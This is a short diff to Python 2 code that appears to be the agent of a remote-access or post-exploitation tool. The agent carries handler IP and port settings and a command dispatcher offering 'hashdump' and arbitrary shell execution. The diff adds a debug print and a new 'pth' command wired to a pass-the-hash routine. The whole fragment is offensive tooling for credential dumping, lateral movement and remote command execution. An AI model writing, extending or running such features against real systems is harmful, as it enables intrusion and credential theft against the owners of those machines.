@@ -35,6 +35,7 @@ try:
 		f.seek(930)
 		AUTH_SECRET = f.read(30)
 except Exception as e:
+	print e
 	logging.debug("We're uncompyled, let's use these values...")
 	HANDLER_IP = "127.0.0.1"
 	HANDLER_PORT = 8080
@@ -207,6 +208,9 @@ help - This menu!
 			
 		elif data == "hashdump":
 			return info.dump_hashes,
+			
+		elif data.startswith("pth"):
+			return net.pass_the_hash, " ".join(data.split()[1:])
 
 		else:
 			return execute.execute_shell_command, data
